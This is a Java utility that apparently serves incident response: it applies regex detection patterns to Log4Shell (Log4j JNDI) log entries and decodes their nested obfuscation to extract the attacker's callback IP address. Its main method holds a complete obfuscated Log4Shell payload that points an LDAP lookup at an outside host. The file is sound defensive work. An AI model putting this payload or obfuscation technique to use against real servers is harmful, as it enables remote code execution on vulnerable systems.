/*
 * author: aero, safest-place
 */

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ExtractIocInLog4jPayload {
    public static String matchRegex(String patternStr, String text){
        Pattern pattern = Pattern.compile(patternStr);
        Matcher matcher = pattern.matcher(text);
        matcher.find();
        String group = matcher.group();
        return group.length() != 0 ? group : "";
    }
    public static String log4jPayloadExtractIP(String jndiStr){
        String log4jPattern          = ".*\\$\\{.*j.*n.*d.*i.*\\}";
        String normalPayloadPattern  = "\\$\\{jndi\\:.*\\}";
        String variantPayloadPattern = "\\$\\{.*\\$\\{.*:-.*\\}";
        String ipaddrPattern         = "((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))";

        jndiStr = matchRegex(log4jPattern, jndiStr);
        if(jndiStr.length() == 0){
            return "";
        }else{
            StringBuilder sb = new StringBuilder();
            String payload   = jndiStr;
            payload          = payload.substring(2);
            for (int i = 0; i < payload.length()-1; i++){
                if (payload.charAt(i) == '}'){
                    char tmpChar = sb.charAt(sb.length()-1);
                    sb.deleteCharAt(sb.length()-1);
                    while (sb.charAt(sb.length()-1) != '{'){
                        sb.deleteCharAt(sb.length()-1);
                    }
                    sb.deleteCharAt(sb.length()-1);
                    sb.deleteCharAt(sb.length()-1);
                    sb.append(tmpChar);
                }else {
                    sb.append(payload.charAt(i));
                }
            }
            String ret = sb.toString();
            ret = matchRegex(ipaddrPattern, ret);
            if (ret.length() != 0){
                return ret;
            }else {
                return "";
            }
        }
    }
    public static void main(String[] args) {
        String p1 = "${${YwLN:qwVY:epJfR:JUXCFV:hJV:-j}ndi:${UJjUI:HJdPfK:yyw:NKsi:-l}${rOllj:ddNARq:Qlx:jdIPuP:-d}${MhgLC:KPTUeD:WUx:hVrm:-a}${zpAd:RBKev:-p}://202.98.0.15:1389/707587}";
        System.out.println(log4jPayloadExtractIP(p1));
    }
}